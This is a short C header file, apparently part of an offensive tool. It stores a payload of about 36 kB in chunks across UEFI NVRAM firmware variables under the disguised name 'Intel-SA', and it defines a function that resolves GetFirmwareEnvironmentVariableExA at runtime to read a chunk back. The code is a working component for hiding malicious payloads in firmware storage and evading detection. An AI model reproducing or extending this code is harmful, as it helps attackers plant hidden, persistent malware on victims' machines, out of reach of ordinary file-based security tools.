#pragma once

#include <Windows.h>

// Constants
// ------------------------------------------------------------------------

// 1000 chars/variable
#define CHUNK_SIZE 1000

// 50 variables could be created before NVRAM space runs out! ~ 36kB payload
#define MAX_NVRAM_VAR 50

// NVRAM Variable Base Name
#define NVRAM_VAR_NAME "Intel-SA"

// Function prototypes
// ------------------------------------------------------------------------

typedef DWORD(WINAPI* _GetFirmwareEnvironmentVariableExA)(
	LPCSTR lpName,
	LPCSTR lpGuid,
	PVOID  pBuffer,
	DWORD  nSize,
	PDWORD pdwAttribubutes
	);

// To retrieve the contents of a single NVRAM variable
// ------------------------------------------------------------------------

BOOL read_nvram(LPCSTR name, LPCSTR guid, LPSTR payload) {
	// Dynamically resolve the API functions from Kernel32.dll
    HMODULE kernel32 = GetModuleHandleA("Kernel32.dll");

	_GetFirmwareEnvironmentVariableExA GetFirmwareEnvironmentVariableExA = (_GetFirmwareEnvironmentVariableExA)GetProcAddress(kernel32, "GetFirmwareEnvironmentVariableExA");
	if (GetFirmwareEnvironmentVariableExA == NULL) {
		return FALSE;
	}

	// Get firmware variable
	DWORD dwAttributes;
	DWORD returnVal = GetFirmwareEnvironmentVariableExA(name, guid, payload, CHUNK_SIZE, &dwAttributes);
	if (returnVal == 0) {
		return FALSE;
	}

	return TRUE;
}